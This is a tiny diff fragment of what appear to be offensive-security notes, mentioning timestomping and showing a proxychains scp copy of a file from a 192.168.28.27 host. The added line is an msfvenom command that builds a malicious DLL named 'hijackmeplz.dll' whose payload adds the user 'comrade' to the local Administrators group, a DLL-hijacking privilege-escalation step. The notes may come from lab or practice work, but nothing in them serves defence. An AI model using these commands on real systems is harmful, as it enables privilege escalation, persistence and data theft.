@@ -81,6 +81,9 @@ Timestomp
 proxychains scp comrade@192.168.28.27:/tmp/10-milli.txt .
 
 
+msfvenom -p windows/exec CMD='cmd.exe /C "net localgroup Administrators comrade /add"' -f dll > hijackmeplz.dll
+
+
 
 
 
